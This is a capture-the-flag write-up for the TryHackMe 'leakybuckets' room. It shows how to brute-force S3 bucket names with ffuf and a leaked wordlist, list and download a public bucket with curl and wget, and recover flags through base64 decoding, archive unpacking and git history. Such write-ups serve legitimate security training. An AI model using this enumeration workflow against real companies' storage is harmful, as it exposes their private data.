# leakybuckets

https://tryhackme.com/room/leakybuckets

## Category

General

## Question

Cloud security challenge for leaking cloud storage

## Solution

### Task 1
Task 1 can be easily achieved by reading the objective description and filling in the blanks. Concept of Principle of least privelege are tested here.

### Task 2
Task to describes of a company that has a lot of s3 buckets deployed and lost track of the inventory. Luckily, there is a naming convention of these buckets from a list of randomly generated words available on a [secret repository](https://gist.github.com/Brucius/29ab688d971dc9d29a74cfa12968dfc4) of former lead engineer.

The format is usually in ```word1-word2-s5f3tch.s3-(Region).amazonaws.com/objectName```  for buckets with objects in it.

First, the list of words to be used are downloaded locally.
```console
% wget https://gist.githubusercontent.com/Brucius/29ab688d971dc9d29a74cfa12968dfc4/raw/9231da760c5cead46a3a9ea1dd430434c8dee1f9/fcorpWordBank.txt
--2021-01-25 13:33:40--  https://gist.githubusercontent.com/Brucius/29ab688d971dc9d29a74cfa12968dfc4/raw/9231da760c5cead46a3a9ea1dd430434c8dee1f9/fcorpWordBank.txt
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 151.101.64.133, 151.101.128.133, 151.101.192.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|151.101.64.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 341 [text/plain]
Saving to: ‘fcorpWordBank.txt’

fcorpWordBank.txt           100%[===========================================>]     341  --.-KB/s    in 0s      

2021-01-25 13:33:42 (14.1 MB/s) - ‘fcorpWordBank.txt’ saved [341/341]

% wc -l fcorpWordBank.txt 
      37 fcorpWordBank.txt
```

We can see that there are 37 unique words inside the word list. It will be tedious to go through all the combinations manually. This process of finding the leaking bucket can be automated in a number of ways. Below is one method being used to find.

ffuf - a URL fuzzer written in go language.

```console
% ffuf -p 0.9-1.1  -w fcorpWordBank.txt:WORD1 -w fcorpWordBank.txt:WORD2 -u "https://WORD1-WORD2-s5f3tch.s3.amazonaws.com/" -c -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://WORD1-WORD2-s5f3tch.s3.amazonaws.com/
 :: Wordlist         : WORD1: fcorpWordBank.txt
 :: Wordlist         : WORD2: fcorpWordBank.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Delay            : 0.90 - 1.10 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

[Status: 200, Size: 578, Words: 4, Lines: 2]
<!-- | URL | https://redacted-redacted-s5f3tch.s3.amazonaws.com/
    * WORD1: redacted
    * WORD2: redacted -->

:: Progress: [1444/1444] :: Job [1/1] :: 18 req/sec :: Duration: [0:01:19] :: Errors: 0 :: 
```
This will give the solution to task 2.

### Task 3
A leaking s3 bucket can be observed as above. The bucket endpoint can be checked by using curl to see if there's any sensitive data inside.

```console
% curl https://redacted-redacted-s5f3tch.s3.amazonaws.com
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>redacted-redacted-s5f3tch</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>redacted.tar</Key><LastModified>2021-01-19T13:56:11.000Z</LastModified><ETag>&quot;032d0913ceda76c18ecacfcc51a6c323&quot;</ETag><Size>81920</Size><Owner><ID>b4969ce01677eaa59404cdb6c545f9f568bd945d51f274a9c7b5e4642f2b628f</ID><DisplayName>ominbruce</DisplayName></Owner><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>%  
```

A zipped file called redacted.tar is found for task 3.

```console
% wget https://redacted-redacted-s5f3tch.s3.amazonaws.com/redacted.tar
--2021-01-25 14:18:29--  https://redacted-redacted-s5f3tch.s3.amazonaws.com/redacted.tar
Resolving redacted-redacted-s5f3tch.s3.amazonaws.com (redacted-redacted-s5f3tch.s3.amazonaws.com)... 52.219.124.228
Connecting to redacted-redacted-s5f3tch.s3.amazonaws.com (redacted-redacted-s5f3tch.s3.amazonaws.com)|52.219.124.228|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 81920 (80K) [application/x-tar]
Saving to: ‘redacted.tar’

redacted.tar                   100%[===========================================>]  80.00K  --.-KB/s    in 0.09s   

2021-01-25 14:18:30 (876 KB/s) - ‘redacted.tar’ saved [81920/81920]
```

### flag1
```console
% tar -xf redacted.tar 
% ls   
makeFlags         redacted.tar
% cd makeFlags 
% cat flag1.txt 
redacted
```
The data seems to be encrypted in base64.
```console
% echo 'redacted' | base64 -d
flag{redacted}
```

### flag2
Instead of flag2, a jpg file is given. By reconning the file, an observation is made that it is not a jpeg file but a base64 encrypted file.

```console
% cat hellofriend.jpg 
QlpoOTFBWSZTWfZlpBQAAA///8n8ThGH7/MA6H5hnOwDFI8JqEmtjvx3851i4RsQyrmpoACUGUGR
piaZBhNDRo0NNGGUNGTTQ0YRoPJNMhmkbENQxNqemU/VN6nkocaTBMACYTABM0JgDU0YBoAIwRgA
JhGGgAAkGCjrUAVtCAxBhlAh1D1B4y7PF0eBrQPvPaLyhGKbwA13KwlcKPkyJAZRaNkkqoih4zs1
pfNTuTRnpYaE6TVIqiOlNb014QZRJPVspS/MCnzR8l3WepSYFNMPw99vCtXqfSz02STwHMo1jk4b
XuoE9JYWAgowDAu//B1WYU7yCQ5WZ+gVwNlhjVytvOAGw8hyxGNQiENb/F3JFOFCQ9mWkFA=

% file hellofriend.jpg 
hellofriend.jpg: ASCII text

% base64 -d hellofriend.jpg > data

% file data 
data: bzip2 compressed data, block size = 900k
```

From the above output, the file is compressed multiple times. It can be uncompressed by following linux commands.

```console
% mv data data.bz2

% bzip2 -d data.bz2

% ls
data

% file data 
data: gzip compressed data, was "data2.tar", last modified: Tue Jan 19 11:57:37 2021, from Unix, original size modulo 2^32 10240

% mv data data.gz

% gzip -d data.gz 

% ls
data 

% file data 
data: POSIX tar archive (GNU)

% mv data data.tar

% tar -xf data.tar 

% ls
data.tar        data2 

% cd data2 

cat flag2.txt 
flag{redacted}                                                           
```

### flag3
Flag 3's text file seems to have been changed by the software engineer. By checking the folder for any hidden files, it is observed that there is a git file within the directory.

```console
% cat flag3.txt 
REDACTED

% ls -la 
total 48
drwxr-xr-x@  8 bruceymac  staff    256 Jan 25 14:35 .
drwxr-xr-x@  7 bruceymac  staff    224 Jan 25 14:35 ..
drwxr-xr-x@ 13 bruceymac  staff    416 Jan 25 14:36 .git
-rw-r--r--   1 bruceymac  staff  10240 Jan 25 14:27 data.tar
drwxr-xr-x@  3 bruceymac  staff     96 Jan 25 14:35 data2
-rw-r--r--   1 bruceymac  staff     36 Jan 19 20:53 flag1.txt
-rw-r--r--   1 bruceymac  staff      8 Jan 19 21:28 flag3.txt
-rw-r--r--   1 bruceymac  staff    381 Jan 19 20:04 hellofriend.jpg
```

Previous git commits can be checked out using the following commands.
```console
% git log
commit 22dd32c133c06822aadc89d9b026cde3df687329 (HEAD -> master)
Author: Kali <user@email.com>
Date:   Tue Jan 19 08:28:25 2021 -0500

    REDACTED

% git checkout redacted
Note: checking out 'redacted'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at redacted

% cat flag3.txt 
redacted

% echo "redacted" | base64 -d
flg{redacted}
```
## Improvement
None